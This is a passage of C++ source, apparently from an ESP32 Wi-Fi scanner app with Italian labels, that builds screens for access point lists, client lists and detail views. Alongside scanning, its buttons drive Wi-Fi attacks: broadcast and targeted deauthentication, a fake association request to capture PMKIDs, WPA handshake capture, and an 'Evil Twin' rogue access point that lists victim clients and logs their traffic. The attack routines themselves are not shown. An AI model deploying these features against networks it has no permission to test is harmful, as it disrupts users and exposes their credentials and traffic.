
    return row;
}

void updateRows(Context* ctx, const std::vector<SeenAp>& aps, const std::map<uint64_t, int>& clientCounts, const std::map<uint64_t, uint32_t>& dataTotals) {
    if (ctx->list == nullptr) return;

    std::vector<uint64_t> keys;
    for (const auto& ap : aps) keys.push_back(bssidKey(ap.record.bssid));

    for (auto it = ctx->rows.begin(); it != ctx->rows.end();) {
        if (std::find(keys.begin(), keys.end(), it->first) == keys.end()) {
            lv_obj_delete(it->second);
            it = ctx->rows.erase(it);
        } else {
            ++it;
        }
    }

    for (const auto& ap : aps) {
        uint64_t key = bssidKey(ap.record.bssid);
        lv_obj_t* row = nullptr;
        auto it = ctx->rows.find(key);
        if (it == ctx->rows.end()) {
            row = createListRow(ctx, key);
            ctx->rows[key] = row;
        } else {
            row = it->second;
        }

        auto* chip = lv_obj_get_child(row, 0);
        lv_obj_set_style_bg_color(chip, lv_color_hex(SERIES_COLORS[ap.colorIndex % MAX_SERIES]), 0);
        lv_obj_set_style_bg_opa(chip, LV_OPA_COVER, 0);

        char ssidLine[48];
        snprintf(ssidLine, sizeof(ssidLine), "%s%s", displaySsid(ap.record), ap.fromCapture ? " *" : "");
        lv_label_set_text(lv_obj_get_child(row, 1), ssidLine);

        char channelText[16];
        char dataText[16];
        snprintf(channelText, sizeof(channelText), "%d", (int)ap.record.channel);
        
        auto dataIt = dataTotals.find(key);
        uint32_t totalDataFrames = dataIt != dataTotals.end() ? dataIt->second : 0;
        snprintf(dataText, sizeof(dataText), "%u", (unsigned)totalDataFrames);

        lv_label_set_text(lv_obj_get_child(row, 2), channelText);
        lv_label_set_text(lv_obj_get_child(row, 3), dataText);
        lv_label_set_text(lv_obj_get_child(row, 4), authToString(ap.record.authentication_type));

        auto countIt = clientCounts.find(key);
        int count = countIt != clientCounts.end() ? countIt->second : 0;
        char cliText[12] = "";
        if (count > 0) snprintf(cliText, sizeof(cliText), "%d", count);
        lv_label_set_text(lv_obj_get_child(row, 5), cliText);
    }
}

void onConnectPressed(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    std::string ssid;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        auto it = ctx->seen.find(ctx->selectedKey);
        if (it != ctx->seen.end()) ssid = it->second.record.ssid;
        ctx->mutex.unlock();
    }
    if (!ssid.empty()) connectTo(ctx, ssid);
}

void updateDetail(Context* ctx) {
    if (ctx->detailSsidLabel == nullptr) return;

    SeenAp ap{};
    bool found = false;
    uint32_t beaconBaseline = 0;
    int clientCount = 0;
    bool hsPresent = false, hsHas[4] = {}, hsPmkid = false, hsSaved = false;
    int deauthBursts = 0;
    bool evilTwin = false;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        auto it = ctx->seen.find(ctx->selectedKey);
        if (it != ctx->seen.end()) {
            ap = it->second;
            found = true;
            beaconBaseline = ctx->detailBeaconBaseline;
            for (const auto& [clientKey, client] : ctx->clients) {
                if (client.associatedBssid == ctx->selectedKey) clientCount++;
            }
            auto hit = ctx->handshakes.find(ctx->selectedKey);
            if (hit != ctx->handshakes.end()) {
                hsPresent = true;
                for (int s = 0; s < 4; s++) hsHas[s] = (hit->second.msgMask & (1 << s)) != 0;
                hsPmkid = hit->second.hasPmkid;
                hsSaved = hit->second.saved;
            }
        }
        deauthBursts = ctx->deauthBurstsSent;
        evilTwin = ctx->evilTwinActive;
        ctx->mutex.unlock();
    }
    if (!found) return;

    uint64_t now = nowMs();
    const char* vendor = lookupVendor(ap.record.bssid);
    uint32_t beaconsSinceOpen = ap.packetCount >= beaconBaseline ? ap.packetCount - beaconBaseline : 0;

    char buf[128];

    snprintf(buf, sizeof(buf), "SSID: %s", displaySsid(ap.record));
    lv_label_set_text(ctx->detailSsidLabel, buf);

    snprintf(buf, sizeof(buf), "MAC: %s (%s)", macToString(ap.record.bssid).c_str(), vendor != nullptr ? vendor : "sconosciuto");
    lv_label_set_text(ctx->detailMacLabel, buf);

    if (!ap.fromCapture) {
        snprintf(buf, sizeof(buf), "Sicurezza: %s | Cifratura: %s", authToString(ap.record.authentication_type), cipherToString(ap.record.pairwise_cipher));
    } else {
        snprintf(buf, sizeof(buf), "Sicurezza: %s (da cattura)", authToString(ap.record.authentication_type));
    }
    lv_label_set_text(ctx->detailSecLabel, buf);

    snprintf(buf, sizeof(buf), "Canale: %d (%d MHz)", (int)ap.record.channel, frequencyMhz((int)ap.record.channel));
    lv_label_set_text(ctx->detailChanLabel, buf);

    snprintf(buf, sizeof(buf), "Potenza: %d dBm (min %d / max %d) | %.1f m", (int)ap.record.rssi, (int)ap.rssiMin, (int)ap.rssiMax, estimateDistanceMeters(ap.record.rssi));
    lv_label_set_text(ctx->detailPowerLabel, buf);

    snprintf(buf, sizeof(buf), "PHY: %s | Fonte: %s", phyToString(ap.record.phy_flags).c_str(), ap.fromCapture ? "passiva" : "attiva");
    lv_label_set_text(ctx->detailPhyLabel, buf);

    snprintf(buf, sizeof(buf), "Beacon: %u | Visto: %us fa", (unsigned)beaconsSinceOpen, (unsigned)((now - ap.lastSeenMs) / 1000));
    lv_label_set_text(ctx->detailTimeLabel, buf);

    if (ctx->detailHsSummary != nullptr) {
        int hsCount = (hsHas[0] ? 1 : 0) + (hsHas[1] ? 1 : 0) + (hsHas[2] ? 1 : 0) + (hsHas[3] ? 1 : 0);
        char hsSummary[64];
        snprintf(hsSummary, sizeof(hsSummary), "Stato -> HS: %d/4%s | PMKID: %s",
            hsCount, (hsPresent && hsSaved) ? " (salvato)" : "", hsPmkid ? "SI" : "NO");
        lv_label_set_text(ctx->detailHsSummary, hsSummary);
    }

    if (ctx->detailDeauthLabel != nullptr) {
        if (deauthBursts > 0) {
            snprintf(buf, sizeof(buf), "Deauth inviati: %d", deauthBursts);
            lv_label_set_text(ctx->detailDeauthLabel, buf);
            lv_obj_remove_flag(ctx->detailDeauthLabel, LV_OBJ_FLAG_HIDDEN);
        } else {
            lv_obj_add_flag(ctx->detailDeauthLabel, LV_OBJ_FLAG_HIDDEN);
        }
    }

    if (ctx->detailClientsButton != nullptr) {
        char buttonText[32];
        snprintf(buttonText, sizeof(buttonText), "Client (%d)", clientCount);
        lv_obj_t* label = lv_obj_get_child(ctx->detailClientsButton, 0);
        if (label != nullptr) lv_label_set_text(label, buttonText);
    }

    if (ctx->detailLockButton != nullptr) {
        bool lockedHere = getCaptureLockChannel() == (int)ap.record.channel && ap.record.channel >= 1;
        char lockText[48];
        if (lockedHere) {
            snprintf(lockText, sizeof(lockText), LV_SYMBOL_SETTINGS " Lock (ch %d)", (int)ap.record.channel);
        } else {
            snprintf(lockText, sizeof(lockText), "Channel Lock");
        }
        lv_obj_t* label = lv_obj_get_child(ctx->detailLockButton, 0);
        if (label != nullptr) lv_label_set_text(label, lockText);
    }

    if (ctx->detailEvilTwinButton != nullptr) {
        char etText[32];
        if (evilTwin) snprintf(etText, sizeof(etText), "Evil Twin: ON");
        else snprintf(etText, sizeof(etText), "Evil Twin");
        lv_obj_t* label = lv_obj_get_child(ctx->detailEvilTwinButton, 0);
        if (label != nullptr) lv_label_set_text(label, etText);
    }
}

constexpr int CLIENT_ROW_HEIGHT = 30;
constexpr int COL_CDBM = 46;
constexpr int COL_TX = 46;
constexpr int COL_RX = 46;
constexpr int COL_IND = 20;

void onSelectClientForDeauth(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    lv_obj_t* row = lv_event_get_current_target_obj(event);
    uint64_t clientKey = 0;

    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        for (const auto& [k, w] : ctx->clientRows) {
            if (w == row) { clientKey = k; break; }
        }
        ctx->targetClientKey = clientKey;
        ctx->mutex.unlock();
    }

    if (clientKey != 0) {
        char macStr[18] = "";
        if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
            auto it = ctx->clients.find(clientKey);
            if (it != ctx->clients.end()) {
                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                    it->second.mac[0], it->second.mac[1], it->second.mac[2],
                    it->second.mac[3], it->second.mac[4], it->second.mac[5]);
            }
            ctx->mutex.unlock();
        }

        char message[128];
        snprintf(message, sizeof(message), "Invia deauth mirato al client:\n%s?", macStr);
        ctx->clientDeauthDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Deauth Mirato", message, { "Invia", "Annulla" });
    }
}

lv_obj_t* createClientRow(Context* ctx) {
    auto* row = lv_list_add_button(ctx->clientsList, nullptr, "");
    lv_obj_clean(row);
    lv_obj_set_height(row, CLIENT_ROW_HEIGHT);
    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(row, 2, 0);
    lv_obj_set_style_pad_column(row, 4, 0);

    auto* mac = lv_label_create(row);
    lv_label_set_long_mode(mac, LV_LABEL_LONG_MODE_SCROLL_CIRCULAR);
    lv_obj_set_flex_grow(mac, 1);

    addFieldLabel(row, COL_CDBM);
    addFieldLabel(row, COL_TX);
    addFieldLabel(row, COL_RX);

    auto* indicator = lv_label_create(row);
    lv_obj_set_width(indicator, COL_IND);
    lv_label_set_text(indicator, LV_SYMBOL_WARNING);
    lv_obj_set_style_text_color(indicator, lv_color_hex(0xB33A3A), 0);
    lv_obj_set_style_text_align(indicator, LV_TEXT_ALIGN_CENTER, 0);

    lv_obj_add_event_cb(row, onSelectClientForDeauth, LV_EVENT_CLICKED, ctx);

    return row;
}

void updateClientsPage(Context* ctx) {
    if (ctx->clientsList == nullptr) return;

    struct Row { uint64_t key; uint32_t frames; std::string mac; int rssi; uint32_t tx; uint32_t rx; };
    std::vector<Row> clientRows2;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        uint64_t selected = ctx->selectedKey;
        uint64_t now = nowMs();
        for (auto it = ctx->clients.begin(); it != ctx->clients.end();) {
            if (now - it->second.lastSeenMs > ROW_EXPIRY_MS) {
                it = ctx->clients.erase(it);
                continue;
            }
            const auto& client = it->second;
            if (client.associatedBssid != selected) { ++it; continue; }

            bool randomMac = (client.mac[0] & 0x02) != 0;
            const char* vendor = randomMac ? nullptr : lookupVendor(client.mac);
            std::string mac = macToString(client.mac) + (randomMac ? " (casuale)" : "");
            if (vendor != nullptr) mac += std::string(" - ") + vendor;

            clientRows2.push_back({it->first, client.packetCount, mac, client.lastRssi, client.txCount, client.rxCount});
            ++it;
        }
        ctx->mutex.unlock();
    }

    std::sort(clientRows2.begin(), clientRows2.end(), [](const Row& a, const Row& b) { return a.frames > b.frames; });

    std::vector<uint64_t> keys;
    for (const auto& row : clientRows2) keys.push_back(row.key);
    for (auto it = ctx->clientRows.begin(); it != ctx->clientRows.end();) {
        if (std::find(keys.begin(), keys.end(), it->first) == keys.end()) {
            lv_obj_delete(it->second);
            it = ctx->clientRows.erase(it);
        } else {
            ++it;
        }
    }
    for (const auto& row : clientRows2) {
        lv_obj_t* widget;
        auto it = ctx->clientRows.find(row.key);
        if (it == ctx->clientRows.end()) {
            widget = createClientRow(ctx);
            ctx->clientRows[row.key] = widget;
        } else {
            widget = it->second;
        }
        char dbm[12], tx[12], rx[12];
        snprintf(dbm, sizeof(dbm), "%d", row.rssi);
        snprintf(tx, sizeof(tx), "%u", (unsigned)row.tx);
        snprintf(rx, sizeof(rx), "%u", (unsigned)row.rx);
        lv_label_set_text(lv_obj_get_child(widget, 0), row.mac.c_str());
        lv_label_set_text(lv_obj_get_child(widget, 1), dbm);
        lv_label_set_text(lv_obj_get_child(widget, 2), tx);
        lv_label_set_text(lv_obj_get_child(widget, 3), rx);
    }
}

void goBack(Context* ctx) {
    Page current;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        current = ctx->page;
        ctx->mutex.unlock();
    } else {
        return;
    }
    if (current == Page::Detail) showPage(ctx, Page::List);
    else if (current == Page::List) showPage(ctx, Page::Graph);
    else if (current == Page::Clients) showPage(ctx, Page::Detail);
    else if (current == Page::EvilTwinDetail) showPage(ctx, Page::Detail);
}

void onHardwareBack(void* userData) {
    goBack(static_cast<Context*>(userData));
}

// ---- UI page builders ----

lv_obj_t* createPage(lv_obj_t* parent) {
    auto* page = lv_obj_create(parent);
    lv_obj_set_flex_flow(page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_width(page, LV_PCT(100));
    lv_obj_set_flex_grow(page, 1);
    lv_obj_set_style_pad_all(page, 0, 0);
    lv_obj_set_style_border_width(page, 0, 0);
    return page;
}

void createAxisLabels(lv_obj_t* parent) {
    auto* row = lv_obj_create(parent);
    lv_obj_set_size(row, LV_PCT(100), 16);
    lv_obj_set_style_pad_all(row, 0, 0);
    lv_obj_set_style_border_width(row, 0, 0);
    lv_obj_remove_flag(row, LV_OBJ_FLAG_SCROLLABLE);
    for (int channel = 1; channel <= 13; channel++) {
        char text[4];
        snprintf(text, sizeof(text), "%d", channel);
        auto* label = lv_label_create(row);
        lv_label_set_text(label, text);
        lv_obj_set_style_text_color(label, lv_color_hex(0x757575), 0);
        lv_obj_set_x(label, lv_pct((int)(100 * channelFraction(channel))));
        lv_obj_set_style_translate_x(label, channel < 10 ? -4 : -8, 0);
    }
}

void createChannelGrid(lv_obj_t* chartWrapper) {
    for (int channel = 1; channel <= 13; channel++) {
        auto* line = lv_obj_create(chartWrapper);
        lv_obj_set_size(line, 1, LV_PCT(100));
        lv_obj_set_style_border_width(line, 0, 0);
        lv_obj_set_style_radius(line, 0, 0);
        lv_obj_set_style_bg_color(line, lv_color_hex(0x505050), 0);
        lv_obj_set_style_bg_opa(line, LV_OPA_30, 0);
        lv_obj_remove_flag(line, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_remove_flag(line, LV_OBJ_FLAG_CLICKABLE);
        lv_obj_set_x(line, lv_pct((int)(100 * channelFraction(channel))));
    }
}

void createYAxisLabels(lv_obj_t* chartWrapper) {
    const struct { const char* text; int pctY; } marks[] = {
        {"-30", 2},
        {"-50", 26},
        {"-70", 55},
        {"-90", 84},
    };
    for (const auto& m : marks) {
        auto* label = lv_label_create(chartWrapper);
        lv_label_set_text(label, m.text);
        lv_obj_set_style_text_color(label, lv_color_hex(0x606060), 0);
        lv_obj_set_style_text_opa(label, LV_OPA_80, 0);
        lv_obj_set_x(label, 2);
        lv_obj_set_y(label, lv_pct(m.pctY));
        lv_obj_remove_flag(label, LV_OBJ_FLAG_CLICKABLE);
        lv_obj_remove_flag(label, LV_OBJ_FLAG_SCROLLABLE);
    }
}

lv_obj_t* createIconButton(lv_obj_t* parent, const char* icon, lv_event_cb_t callback, Context* ctx, int size = 40) {
    auto* button = lv_button_create(parent);
    lv_obj_set_size(button, size, size);
    lv_obj_set_style_pad_all(button, 0, 0);
    auto* label = lv_label_create(button);
    lv_label_set_text(label, icon);
    lv_obj_center(label);
    lv_obj_add_event_cb(button, callback, LV_EVENT_SHORT_CLICKED, ctx);
    return button;
}

lv_obj_t* createSectionCard(lv_obj_t* parent, const char* titleText) {
    auto* card = lv_button_create(parent);
    lv_obj_set_width(card, LV_PCT(100));
    lv_obj_set_height(card, LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(card, 4, 0);
    lv_obj_set_style_pad_row(card, 2, 0);
    lv_obj_set_style_radius(card, 4, 0);
    lv_obj_set_style_border_width(card, 1, 0);
    lv_obj_set_style_border_color(card, lv_color_hex(0x505050), 0);
    lv_obj_set_style_bg_color(card, lv_color_hex(0x181818), 0);
    lv_obj_set_style_bg_opa(card, LV_OPA_COVER, 0);
    lv_obj_remove_flag(card, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(card, LV_OBJ_FLAG_SCROLL_ON_FOCUS);

    if (titleText && titleText[0] != '\0') {
        auto* title = lv_label_create(card);
        lv_label_set_text(title, titleText);
        lv_obj_set_style_text_color(title, lv_color_hex(0x80C0FF), 0);
    }
    return card;
}

void updateEvilTwinDetailPage(Context* ctx) {
#ifdef ESP_PLATFORM
    if (ctx->etStatusLabel == nullptr || ctx->etClientsList == nullptr) return;

    char statusBuf[160];
    char ssid[33] = {};
    bool active = false;
    int channel = 0;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        auto it = ctx->seen.find(ctx->selectedKey);
        if (it != ctx->seen.end()) {
            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
            channel = it->second.record.channel;
        }
        active = ctx->evilTwinActive;
        ctx->mutex.unlock();
    }

    bool logging = ctx->evilTwinLogging.load();
    uint32_t pkts = g_etPacketsLogged.load();

    snprintf(statusBuf, sizeof(statusBuf), "SSID: %s\nCanale: %d | Stato: %s\nLog SD: %s (%u pkt)",
        ssid[0] != '\0' ? ssid : "(nascosta)", channel,
        active ? "ATTIVO (Rogue AP)" : "SPENTO",
        logging ? "IN CORSO" : "FERMO", (unsigned)pkts);
    lv_label_set_text(ctx->etStatusLabel, statusBuf);

    if (ctx->etLogToggleButton != nullptr) {
        lv_obj_t* label = lv_obj_get_child(ctx->etLogToggleButton, 0);
        if (label != nullptr) {
            if (logging) {
                char btnTxt[48];
                snprintf(btnTxt, sizeof(btnTxt), LV_SYMBOL_STOP " Ferma Log SD (%u)", (unsigned)pkts);
                lv_label_set_text(label, btnTxt);
            } else {
                lv_label_set_text(label, LV_SYMBOL_SAVE " Avvia Logging Traffico SD");
            }
        }
    }

    if (active) {
        wifi_sta_list_t sta_list = {};
        if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK) {
            lv_obj_clean(ctx->etClientsList);
            for (int i = 0; i < sta_list.num; i++) {
                char macStr[18];
                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                    sta_list.sta[i].mac[0], sta_list.sta[i].mac[1], sta_list.sta[i].mac[2],
                    sta_list.sta[i].mac[3], sta_list.sta[i].mac[4], sta_list.sta[i].mac[5]);
                
                auto* row = lv_list_add_button(ctx->etClientsList, LV_SYMBOL_WARNING, macStr);
                lv_obj_set_height(row, 30);
            }
            if (sta_list.num == 0) {
                auto* row = lv_list_add_button(ctx->etClientsList, nullptr, "Nessun client agganciato");
                lv_obj_set_height(row, 30);
            }
        }
    } else {
        lv_obj_clean(ctx->etClientsList);
        auto* row = lv_list_add_button(ctx->etClientsList, nullptr, "Evil Twin non attivo");
        lv_obj_set_height(row, 30);
    }
#else
    (void)ctx;
#endif
}

void createEvilTwinDetailPage(Context* ctx, lv_obj_t* parent) {
    ctx->etDetailPage = createPage(parent);
    lv_obj_add_flag(ctx->etDetailPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_set_style_pad_all(ctx->etDetailPage, 4, 0);

    auto* scroll = lv_obj_create(ctx->etDetailPage);
    lv_obj_set_width(scroll, LV_PCT(100));
    lv_obj_set_flex_grow(scroll, 1);
    lv_obj_set_flex_flow(scroll, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(scroll, 4, 0);
    lv_obj_set_style_pad_row(scroll, 4, 0);

    auto* statusCard = createSectionCard(scroll, "Stato Rogue AP");
    ctx->etStatusLabel = lv_label_create(statusCard);
    lv_label_set_text(ctx->etStatusLabel, "Stato: INATTIVO");
    lv_label_set_long_mode(ctx->etStatusLabel, LV_LABEL_LONG_MODE_WRAP);
    lv_obj_set_width(ctx->etStatusLabel, LV_PCT(100));

    ctx->etLogToggleButton = lv_button_create(scroll);
    lv_obj_set_width(ctx->etLogToggleButton, LV_PCT(100));
    lv_obj_set_height(ctx->etLogToggleButton, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_ver(ctx->etLogToggleButton, 6, 0);
    lv_obj_set_style_radius(ctx->etLogToggleButton, 4, 0);
    lv_obj_set_style_border_width(ctx->etLogToggleButton, 1, 0);
    lv_obj_set_style_border_color(ctx->etLogToggleButton, lv_color_hex(0x505050), 0);
    lv_obj_set_style_bg_color(ctx->etLogToggleButton, lv_color_hex(0x181818), 0);
    lv_obj_set_style_bg_opa(ctx->etLogToggleButton, LV_OPA_COVER, 0);
    lv_obj_add_flag(ctx->etLogToggleButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
    auto* logLbl = lv_label_create(ctx->etLogToggleButton);
    lv_label_set_text(logLbl, LV_SYMBOL_SAVE " Avvia Logging Traffico SD");
    lv_obj_center(logLbl);
    lv_obj_add_event_cb(ctx->etLogToggleButton, [](lv_event_t* e) {
        auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
        char ssid[33] = {};
        if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
            auto it = ctx->seen.find(ctx->selectedKey);
            if (it != ctx->seen.end()) {
                strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
            }
            ctx->mutex.unlock();
        }

        bool wasLogging = ctx->evilTwinLogging.load();
        if (!wasLogging) {
            if (startEvilTwinLogging(ssid[0] != '\0' ? ssid : "eviltwin")) {
                ctx->evilTwinLogging.store(true);
            }
        } else {
            stopEvilTwinLogging();
            ctx->evilTwinLogging.store(false);
        }
        updateEvilTwinDetailPage(ctx);
    }, LV_EVENT_CLICKED, ctx);

    auto* clientsCard = createSectionCard(scroll, "Client Agganciati al Rogue AP");
    ctx->etClientsList = lv_list_create(clientsCard);
    lv_obj_set_width(ctx->etClientsList, LV_PCT(100));
    lv_obj_set_height(ctx->etClientsList, 120);
    lv_obj_set_style_pad_all(ctx->etClientsList, 0, 0);
}

void createDetailPage(Context* ctx, lv_obj_t* parent) {
    ctx->detailPage = createPage(parent);
    lv_obj_add_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_set_style_pad_all(ctx->detailPage, 2, 0);

    auto* scroll = lv_obj_create(ctx->detailPage);
    lv_obj_set_width(scroll, LV_PCT(100));
    lv_obj_set_flex_grow(scroll, 1);
    lv_obj_set_flex_flow(scroll, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(scroll, 4, 0);
    lv_obj_set_style_pad_row(scroll, 4, 0);
    ctx->detailScroll = scroll;

    // Contenitore griglia 2x2 per i primi 4 tasti
    auto* gridContainer = lv_obj_create(scroll);
    lv_obj_set_width(gridContainer, LV_PCT(100));
    lv_obj_set_height(gridContainer, LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(gridContainer, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_style_pad_all(gridContainer, 0, 0);
    lv_obj_set_style_pad_column(gridContainer, 4, 0);
    lv_obj_set_style_pad_row(gridContainer, 4, 0);
    lv_obj_set_style_border_width(gridContainer, 0, 0);
    lv_obj_set_style_bg_opa(gridContainer, LV_OPA_TRANSP, 0);
    lv_obj_remove_flag(gridContainer, LV_OBJ_FLAG_SCROLLABLE);

    // 1. Client associati (48%)
    ctx->detailClientsButton = lv_button_create(gridContainer);
    lv_obj_set_width(ctx->detailClientsButton, LV_PCT(48));
    lv_obj_set_height(ctx->detailClientsButton, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_ver(ctx->detailClientsButton, 6, 0);
    lv_obj_set_style_radius(ctx->detailClientsButton, 4, 0);
    lv_obj_set_style_border_width(ctx->detailClientsButton, 1, 0);
    lv_obj_set_style_border_color(ctx->detailClientsButton, lv_color_hex(0x505050), 0);
    lv_obj_set_style_bg_color(ctx->detailClientsButton, lv_color_hex(0x181818), 0);
    lv_obj_set_style_bg_opa(ctx->detailClientsButton, LV_OPA_COVER, 0);
    lv_obj_add_flag(ctx->detailClientsButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
    auto* cliLbl = lv_label_create(ctx->detailClientsButton);
    lv_label_set_text(cliLbl, LV_SYMBOL_LIST " Client (0)");
    lv_obj_center(cliLbl);
    lv_obj_add_event_cb(ctx->detailClientsButton, onShowClients, LV_EVENT_CLICKED, ctx);

    if (isCaptureSupported()) {
        // 2. Channel Lock (48%)
        ctx->detailLockButton = lv_button_create(gridContainer);
        lv_obj_set_width(ctx->detailLockButton, LV_PCT(48));
        lv_obj_set_height(ctx->detailLockButton, LV_SIZE_CONTENT);
        lv_obj_set_style_pad_ver(ctx->detailLockButton, 6, 0);
        lv_obj_set_style_radius(ctx->detailLockButton, 4, 0);
        lv_obj_set_style_border_width(ctx->detailLockButton, 1, 0);
        lv_obj_set_style_border_color(ctx->detailLockButton, lv_color_hex(0x505050), 0);
        lv_obj_set_style_bg_color(ctx->detailLockButton, lv_color_hex(0x181818), 0);
        lv_obj_set_style_bg_opa(ctx->detailLockButton, LV_OPA_COVER, 0);
        lv_obj_add_flag(ctx->detailLockButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
        auto* lockLbl = lv_label_create(ctx->detailLockButton);
        lv_label_set_text(lockLbl, "Channel Lock");
        lv_obj_center(lockLbl);
        lv_obj_add_event_cb(ctx->detailLockButton, onToggleLock, LV_EVENT_CLICKED, ctx);

        // 3. Deauth ALL (48%)
        ctx->detailDeauthButton = lv_button_create(gridContainer);
        lv_obj_set_width(ctx->detailDeauthButton, LV_PCT(48));
        lv_obj_set_height(ctx->detailDeauthButton, LV_SIZE_CONTENT);
        lv_obj_set_style_pad_ver(ctx->detailDeauthButton, 6, 0);
        lv_obj_set_style_radius(ctx->detailDeauthButton, 4, 0);
        lv_obj_set_style_border_width(ctx->detailDeauthButton, 1, 0);
        lv_obj_set_style_border_color(ctx->detailDeauthButton, lv_color_hex(0x505050), 0);
        lv_obj_set_style_bg_color(ctx->detailDeauthButton, lv_color_hex(0xB33A3A), 0);
        lv_obj_set_style_bg_opa(ctx->detailDeauthButton, LV_OPA_COVER, 0);
        lv_obj_add_flag(ctx->detailDeauthButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
        auto* deauthLbl = lv_label_create(ctx->detailDeauthButton);
        lv_label_set_text(deauthLbl, LV_SYMBOL_WARNING " Deauth ALL");
        lv_obj_center(deauthLbl);
        lv_obj_add_event_cb(ctx->detailDeauthButton, onDeauthPressed, LV_EVENT_CLICKED, ctx);

        // 4. Trigger PMKID (48%)
        ctx->detailPmkidButton = lv_button_create(gridContainer);
        lv_obj_set_width(ctx->detailPmkidButton, LV_PCT(48));
        lv_obj_set_height(ctx->detailPmkidButton, LV_SIZE_CONTENT);
        lv_obj_set_style_pad_ver(ctx->detailPmkidButton, 6, 0);
        lv_obj_set_style_radius(ctx->detailPmkidButton, 4, 0);
        lv_obj_set_style_border_width(ctx->detailPmkidButton, 1, 0);
        lv_obj_set_style_border_color(ctx->detailPmkidButton, lv_color_hex(0x505050), 0);
        lv_obj_set_style_bg_color(ctx->detailPmkidButton, lv_color_hex(0x2E7D32), 0);
        lv_obj_set_style_bg_opa(ctx->detailPmkidButton, LV_OPA_COVER, 0);
        lv_obj_add_flag(ctx->detailPmkidButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
        auto* pmkidLbl = lv_label_create(ctx->detailPmkidButton);
        lv_label_set_text(pmkidLbl, LV_SYMBOL_WIFI " PMKID");
        lv_obj_center(pmkidLbl);
        lv_obj_add_event_cb(ctx->detailPmkidButton, [](lv_event_t* e) {
            auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
            char ssid[33] = {};
            bool found = false;
            if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
                auto it = ctx->seen.find(ctx->selectedKey);
                if (it != ctx->seen.end()) {
                    strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
                    found = true;
                }
                ctx->mutex.unlock();
            }
            if (!found) return;
            char msg[160];
            snprintf(msg, sizeof(msg), "Invia Fake Association Request a \"%s\"\nper forzare e catturare il PMKID?",
                ssid[0] != '\0' ? ssid : "(nascosta)");
            ctx->pmkidDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Trigger PMKID", msg, { "Invia", "Annulla" });
        }, LV_EVENT_CLICKED, ctx);
    }

    // Contenitore griglia per Evil Twin e Dettagli ET affiancati
    auto* etGridContainer = lv_obj_create(scroll);
    lv_obj_set_width(etGridContainer, LV_PCT(100));
    lv_obj_set_height(etGridContainer, LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(etGridContainer, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_style_pad_all(etGridContainer, 0, 0);
    lv_obj_set_style_pad_column(etGridContainer, 4, 0);
    lv_obj_set_style_pad_row(etGridContainer, 4, 0);
    lv_obj_set_style_border_width(etGridContainer, 0, 0);
    lv_obj_set_style_bg_opa(etGridContainer, LV_OPA_TRANSP, 0);
    lv_obj_remove_flag(etGridContainer, LV_OBJ_FLAG_SCROLLABLE);

    if (isCaptureSupported()) {
        // 5. Evil Twin (48%)
        ctx->detailEvilTwinButton = lv_button_create(etGridContainer);
        lv_obj_set_width(ctx->detailEvilTwinButton, LV_PCT(48));
        lv_obj_set_height(ctx->detailEvilTwinButton, LV_SIZE_CONTENT);
        lv_obj_set_style_pad_ver(ctx->detailEvilTwinButton, 6, 0);
        lv_obj_set_style_radius(ctx->detailEvilTwinButton, 4, 0);
        lv_obj_set_style_border_width(ctx->detailEvilTwinButton, 1, 0);
        lv_obj_set_style_border_color(ctx->detailEvilTwinButton, lv_color_hex(0x505050), 0);
        lv_obj_set_style_bg_color(ctx->detailEvilTwinButton, lv_color_hex(0xD97706), 0);
        lv_obj_set_style_bg_opa(ctx->detailEvilTwinButton, LV_OPA_COVER, 0);
        lv_obj_add_flag(ctx->detailEvilTwinButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
        auto* etLbl = lv_label_create(ctx->detailEvilTwinButton);
        lv_label_set_text(etLbl, LV_SYMBOL_WARNING " Evil Twin");
        lv_obj_center(etLbl);
        lv_obj_add_event_cb(ctx->detailEvilTwinButton, [](lv_event_t* e) {
